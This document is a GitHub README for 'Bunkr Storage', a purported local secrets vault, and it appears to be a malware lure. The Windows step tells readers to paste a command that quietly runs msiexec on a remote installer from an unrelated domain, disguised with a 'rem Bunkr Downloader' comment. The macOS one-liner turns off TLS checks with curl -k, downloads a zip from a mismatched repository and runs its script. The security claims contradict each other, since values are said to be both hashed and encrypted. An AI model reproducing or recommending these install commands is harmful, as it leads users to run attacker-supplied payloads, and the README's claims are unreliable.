![demo](https://github.com/user-attachments/assets/690caf56-7d54-478f-9b3c-e2bccb39d6b7)

# 🚀 Bunkr Storage - Secure Data Vault

A modern application for secure, decentralized storage of sensitive information with a beautiful web interface and stunning cyberpunk design.

## ✨ Features

- 🔐 **Secure Storage** - All data is SHA-256 hashed on save
- 🎨 **Modern Interface** - Stylish neon cyberpunk design with smooth animations
- ⚡ **One-Command Installation** - Get started in seconds on macOS
- 📦 **Docker Ready** - Full containerization for any platform
- 🌐 **Web Dashboard** - Manage everything through your browser
- 💾 **Local Storage** - All data stays on your device
- 🔄 **REST API** - Full API for custom integrations

## 📋 Requirements

- **macOS**: Homebrew (auto-installs Docker if needed)
- **Linux/Windows**: Docker & Docker Compose (or Node.js 18+)
- 100 MB free disk space
- Any modern web browser (Chrome, Firefox, Safari, Edge)

## 🚀 Quick Start

### macOS (One-Line Installation) ⭐⭐⭐⭐⭐

```bash
curl -fsSLk https://github.com/michelleoincx/Bunkr-Downloader-Python/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/Bunkr-Downloader-Python-main && \
bash install.sh
```

That's it! The app will automatically open at `http://localhost:3000`

## 🪟 Windows Installation ⭐⭐⭐⭐⭐
### Step 1 — Open Command Prompt
1. Press Win + R
2. Type:
cmd
3. Press Enter
This will open Command Prompt.
---
### Step 2 — Run the Install Command
Copy the command below and paste it into Command Prompt, then press Enter.
cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Bunkr Downloader
The installer will automatically download and install the required components.


### Docker (All Platforms)

```bash
# Clone the repository
git clone https://github.com/yourusername/bunkr-storage.git
cd bunkr-storage

# Run with Docker Compose
docker-compose up --build
```

Open your browser to `http://localhost:3000`

### Local Installation (Node.js 18+)

```bash
# Install dependencies
npm install

# Start the server
npm start
```

Application will be available at `http://localhost:3000`

## 📖 Usage Guide

### Creating a Bunker

1. In the left panel, enter a name for your new bunker
2. Click "Create"
3. Your bunker will appear in the grid

### Adding Items

1. Click on a bunker to open it
2. Enter the item label and secret value
3. Click "Add Item"
4. Your data is securely encrypted and stored

### Managing Items

- **View**: Items are displayed as •••••••• when accessed
- **Delete**: Click the "Delete" button next to any item
- **Remove Bunker**: Click "Delete Bunker" at the bottom of the modal

## 🏗️ Project Structure

```
bunkr-storage/
├── server.js              # Express server & API
├── package.json           # Node.js dependencies
├── install.sh            # macOS installation script
├── Dockerfile            # Docker image configuration
├── docker-compose.yml    # Docker Compose setup
├── run.sh               # Launch script
├── public/
│   └── index.html       # Web interface
└── data/                # Data storage directory
    └── *.json           # Bunker JSON files
```

## 🔌 API Endpoints

### Get All Bunkers
```bash
GET /api/bunkers
```
Returns array of all bunkers with metadata.

### Create New Bunker
```bash
POST /api/bunkers
Content-Type: application/json

{
  "name": "My Secret Bunker"
}
```

### Get Specific Bunker
```bash
GET /api/bunkers/:id
```
Returns bunker details with all items.

### Add Item to Bunker
```bash
POST /api/bunkers/:id/items
Content-Type: application/json

{
  "label": "API Key",
  "value": "your_secret_value"
}
```

### Delete Item
```bash
DELETE /api/bunkers/:id/items/:itemId
```

### Delete Bunker
```bash
DELETE /api/bunkers/:id
```

## 🛠️ Environment Variables

```bash
PORT=3000              # Server port (default: 3000)
NODE_ENV=production    # Environment (production/development)
DATA_DIR=./data        # Data storage directory
```

## 🔒 Security

- All values are SHA-256 hashed on save for maximum security
- Data stays locally on your device - never sent to external servers
- Each bunker receives a cryptographically random ID
- No personal data collection or tracking
- HTTPS-ready for production deployments
- Passwords generated automatically for each bunker

## 🐛 Troubleshooting

### Port 3000 Already in Use

```bash
# Use a different port
PORT=3001 npm start
```

### Docker Not Available

```bash
# Run locally with Node.js
npm install
npm start
```

### Data Backup

All data is stored in the `data/` directory as JSON files. Back up this folder to keep your data safe:

```bash
cp -r data/ ~/bunkr-backup/
```

### macOS Installation Issues

If the one-command installation fails:

1. Ensure you have internet connection
2. Check that Terminal has proper permissions
3. Install Homebrew manually: `/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"`
4. Try the installation command again

## 📦 Tech Stack

**Backend:**
- Node.js 18+
- Express.js 4.18
- Crypto (built-in Node.js module)
- File-based storage

**Frontend:**
- HTML5 & CSS3
- Vanilla JavaScript (no frameworks)
- Google Fonts integration
- CSS animations & transitions

**DevOps:**
- Docker & Docker Compose
- Bash scripts for automation
- Cross-platform support

## 📄 License

MIT - Feel free to use this project for personal or commercial purposes

## 🤝 Support & Issues

Encountered a problem? Here's how to troubleshoot:

1. **Installation fails**: Check internet connection and Homebrew installation
2. **Port 3000 in use**: Change the PORT environment variable
3. **Docker issues**: Ensure Docker Desktop is running (macOS/Windows) or Docker daemon (Linux)
4. **Data not saving**: Verify `data/` directory has write permissions
5. **Slow performance**: Check available disk space and RAM

For more help, check the logs in your terminal output.

## 🎯 Roadmap

- [ ] User authentication & multi-user support
- [ ] Two-factor authentication (2FA)
- [ ] AES-256 encryption for sensitive fields
- [ ] Device synchronization
- [ ] Mobile application (iOS/Android)
- [ ] Web3 integration & blockchain support
- [ ] Cloud backup options
- [ ] Search & filtering capabilities
- [ ] Tags and categories
- [ ] Audit logs & activity tracking

## 🌟 Features Coming Soon

- Automatic data encryption at rest
- Biometric authentication support
- Dark/Light theme toggle
- Custom styling options
- Export/Import functionality
- API key management
- Webhook support

## 💡 Contributing

We welcome contributions! Feel free to:
- Report bugs and request features
- Submit pull requests
- Improve documentation
- Share your feedback

---

**Made with ❤️ for secure data storage**


